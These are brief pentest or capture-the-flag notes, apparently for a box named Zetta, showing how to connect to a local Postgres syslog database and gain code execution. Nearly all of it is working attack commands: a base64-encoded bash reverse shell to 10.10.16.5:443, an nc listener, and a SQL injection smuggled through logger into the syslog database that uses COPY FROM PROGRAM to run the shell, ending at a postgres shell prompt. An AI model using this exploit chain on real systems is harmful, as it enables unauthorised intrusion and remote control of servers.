
### CONECTARSE A POSTGRES
```shell
psql -U postgres -h 127.0.0.1 -d syslog
```

### POSTGRES RCE
```shell
echo -n "bash -i >& /dev/tcp/10.10.16.5/443 0>&1" | base64; echo
❯ sudo nc -nlvp 443
logger -p local7.info "test', NULL); DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM \$$ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0MyAwPiYx | base64 -d | bash \$$;-- -"
postgres@zetta:/var/lib/postgresql/11/main$
```